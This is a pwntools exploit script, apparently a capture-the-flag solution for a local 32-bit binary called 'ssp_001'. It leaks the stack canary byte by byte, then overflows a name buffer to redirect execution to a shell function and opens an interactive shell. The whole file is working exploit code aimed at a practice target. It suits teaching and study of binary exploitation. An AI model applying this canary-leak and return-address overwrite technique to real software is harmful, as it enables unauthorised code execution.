from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connect
p = process('./ssp_001')

# Set Context
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

addr_sh = 0x80486b9

# Get Canary
canary = []
for i in range(0x08):
    p.sendafter(b'> ', b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(str(0x80 + i + 1))
    c = p.recvline()[-4:-2]
    canary.append(hex(int(c.decode('utf-8'), 16)))

# Write Payload
p.sendafter(b'> ', b'E')
p.recvuntil(b'Name Size : ')
p.sendline(str(0x50))
p.recvuntil(b'Name : ')

payload = b'A'*0x40
for i in canary:
    i = i.ljust(4, '0')
    payload += bytes(i[-2:], 'utf-8')
payload += p32(addr_sh)
p.sendline(payload)


p.recvline()
p.interactive()
